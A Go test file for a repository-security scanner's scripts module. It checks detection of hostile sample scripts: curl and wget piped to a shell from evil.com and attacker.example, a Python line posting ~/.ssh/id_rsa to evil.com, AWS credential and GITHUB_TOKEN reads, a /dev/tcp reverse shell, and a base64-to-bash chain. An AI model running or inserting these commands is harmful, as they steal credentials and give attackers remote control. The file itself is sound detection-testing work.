package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestScripts_NoScripts(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "README.md"), []byte("# Project"), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestScripts_CurlPipeShell(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/bash\n# Install dependencies\ncurl -fsSL http://evil.com/install.sh | sh\necho done\n"
	if err := os.WriteFile(filepath.Join(dir, "setup.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for curl|sh, got none")
	}
	if findings[0].Severity != scanner.Medium {
		t.Errorf("severity = %v, want MEDIUM", findings[0].Severity)
	}
}

func TestScripts_WgetPipeBash(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/bash\nwget -O- http://attacker.example/payload | bash\n"
	if err := os.WriteFile(filepath.Join(dir, "install.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for wget|bash, got none")
	}
}

func TestScripts_CredentialAccess_SSHKey(t *testing.T) {
	dir := t.TempDir()
	script := "#!/usr/bin/env python3\nimport os, requests\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\nrequests.post('http://evil.com/collect', data=key)\n"
	if err := os.WriteFile(filepath.Join(dir, "helper.py"), []byte(script), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for ~/.ssh/id_rsa access, got none")
	}
}

func TestScripts_CredentialAccess_AWSCreds(t *testing.T) {
	dir := t.TempDir()
	script := "const fs = require('fs');\nconst creds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');\n"
	if err := os.WriteFile(filepath.Join(dir, "init.js"), []byte(script), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for ~/.aws/credentials access, got none")
	}
}

func TestScripts_ReverseShell(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
	if err := os.WriteFile(filepath.Join(dir, "connect.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for /dev/tcp/ reverse shell, got none")
	}
}

func TestScripts_Base64DecodeChain(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/bash\necho 'aGVsbG8=' | base64 -d | bash\n"
	if err := os.WriteFile(filepath.Join(dir, "run.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for base64 decode chain, got none")
	}
}

func TestScripts_EnvTokenAccess(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/bash\nTOKEN=$GITHUB_TOKEN\necho \"token: $TOKEN\"\n"
	if err := os.WriteFile(filepath.Join(dir, "post.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for $GITHUB_TOKEN access, got none")
	}
}

func TestScripts_SafeScript(t *testing.T) {
	dir := t.TempDir()
	script := "#!/bin/bash\nset -euo pipefail\necho 'Building project...'\ngo build ./...\necho 'Running tests...'\ngo test ./...\necho 'Done.'\n"
	if err := os.WriteFile(filepath.Join(dir, "build.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe script got %d findings, want 0", len(findings))
	}
}

func TestScripts_SkipsNodeModules(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules", "evil-pkg")
	if err := os.MkdirAll(nmDir, 0755); err != nil {
		t.Fatal(err)
	}
	script := "curl http://evil.com | sh\n"
	if err := os.WriteFile(filepath.Join(nmDir, "install.sh"), []byte(script), 0755); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("node_modules should be skipped, got %d findings", len(findings))
	}
}

func TestScripts_SkipsLargeFiles(t *testing.T) {
	dir := t.TempDir()
	large := make([]byte, 1024*1024+100)
	for i := range large {
		large[i] = 'a'
	}
	copy(large[len(large)-30:], []byte("\ncurl http://x.com | sh\n"))
	if err := os.WriteFile(filepath.Join(dir, "large.sh"), large, 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewScriptsModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("file >1MB should be skipped, got %d findings", len(findings))
	}
}

func TestScripts_Name(t *testing.T) {
	m := scanner.NewScriptsModule()
	if m.Name() != "scripts" {
		t.Errorf("Name() = %q, want %q", m.Name(), "scripts")
	}
}
